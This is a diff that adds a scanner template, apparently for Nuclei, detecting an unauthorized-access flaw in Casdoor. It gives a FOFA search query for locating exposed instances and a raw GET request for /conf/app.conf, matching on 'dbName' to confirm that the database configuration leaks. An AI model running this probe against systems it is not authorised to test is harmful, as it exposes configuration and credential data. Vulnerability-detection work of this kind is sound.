@@ -1,0 +1,24 @@
+id: casdoor-app-unauthorized-access
+
+info:
+  name: "Casdoor 未授权访问导致信息泄露"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="Casdoor"
+      该漏洞源于Casdoor系统未正确实施访问控制机制，攻击者可通过构造特定请求绕过身份验证流程，直接获取敏感数据。
+  tags: Casdoor
+
+http:
+- raw:
+  - |
+    GET /conf/app.conf HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'dbName'
